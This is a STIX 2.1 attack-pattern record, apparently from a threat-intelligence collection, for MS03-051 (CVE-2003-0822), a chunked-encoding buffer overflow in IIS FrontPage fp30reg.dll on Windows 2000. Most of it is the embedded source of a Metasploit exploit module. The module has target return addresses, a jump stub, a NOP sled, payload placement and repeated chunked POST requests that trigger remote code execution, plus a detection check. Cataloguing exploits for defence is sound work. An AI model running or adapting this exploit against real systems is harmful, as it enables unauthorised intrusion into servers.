{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a82cb7cf-21c3-4731-8db1-4b47af2b41ea",
    "created": "2024-08-14T16:55:56.217122Z",
    "modified": "2024-08-14T16:55:56.217126Z",
    "name": "MS03-051 Microsoft IIS ISAPI FrontPage fp30reg.dll Chunked Overflow",
    "description": " This is an exploit for the chunked encoding buffer overflow described in MS03-051 and originally reported by Brett Moore. This particular modules works against versions of Windows 2000 between SP0 and SP3. Service Pack 4 fixes the issue. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/isapi/ms03_051_fp30reg_chunked.rb",
            "external_id": "ms03_051_fp30reg_chunked.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0822"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS03-051 Microsoft IIS ISAPI FrontPage fp30reg.dll Chunked Overflow',\n      'Description'    => %q{\n          This is an exploit for the chunked encoding buffer overflow\n        described in MS03-051 and originally reported by Brett\n        Moore. This particular modules works against versions of\n        Windows 2000 between SP0 and SP3. Service Pack 4 fixes the\n        issue.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0822'],\n          [ 'OSVDB', '2952'],\n          [ 'BID', '9007'],\n          [ 'MSB', 'MS03-051'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x2b\\x26\\x3d\\x25\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 SP0-SP3',  { 'Ret' => 0x6c38a4d0  }],   # from mfc42.dll\n          ['Windows 2000 07/22/02', { 'Ret' => 0x67d44eb1  }],   # from fp30reg.dll 07/22/2002\n          ['Windows 2000 10/06/99', { 'Ret' => 0x67d4665d  }],   # from fp30reg.dll 10/06/1999\n        ],\n      'DisclosureDate' => '2003-11-11',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('URL', [ true,  \"The path to fp30reg.dll\", \"/_vti_bin/_vti_aut/fp30reg.dll\" ]),\n      ])\n  end\n\n  def exploit\n\n    print_status(\"Creating overflow request for fp30reg.dll...\")\n\n    pat = rand_text_alphanumeric(0xdead)\n    pat[128, 4] = [target.ret].pack('V')\n    pat[264, 4] = [target.ret].pack('V')\n\n    # sub eax,0xfffffeff; jmp eax\n    pat[160, 7] = \"\\x2d\\xff\\xfe\\xff\\xff\" + \"\\xff\\xe0\"\n\n    pat[280, 512] = make_nops(512)\n    pat[792, payload.encoded.length] = payload.encoded\n\n    0.upto(15) do |i|\n\n      if (i % 3 == 0)\n        print_status(\"Refreshing the remote dllhost.exe process...\")\n\n        res = send_request_raw({\n          'uri' => normalize_uri(datastore['URL'])\n        }, -1)\n\n        if (res and res.body =~ /specified module could not be found/)\n          print_status(\"The server states that #{datastore['URL']} does not exist.\\n\")\n          return\n        end\n      end\n\n      print_status(\"Trying to exploit fp30reg.dll (request #{i} of 15)\")\n\n      res = send_request_raw({\n        'uri'     => normalize_uri(datastore['URL']),\n        'method'  => 'POST',\n        'headers' =>\n        {\n          'Transfer-Encoding' => 'Chunked'\n        },\n        'data'    => \"DEAD\\r\\n#{pat}\\r\\n0\\r\\n\"\n      }, 5)\n\n      if (res and res.body =~ /specified module could not be found/)\n        print_status(\"The server states that #{datastore['URL']} does not exist.\\n\")\n        return\n      end\n\n      handler\n\n      select(nil,nil,nil,1)\n    end\n  end\n\n  def check\n    print_status(\"Requesting the vulnerable ISAPI path...\")\n    r = send_request_raw({\n      'uri' => normalize_uri(datastore['URL'])\n    }, -1)\n\n    if (r and r.code == 501)\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-11-11",
    "x_mitre_platforms": [
        "win'"
    ]
}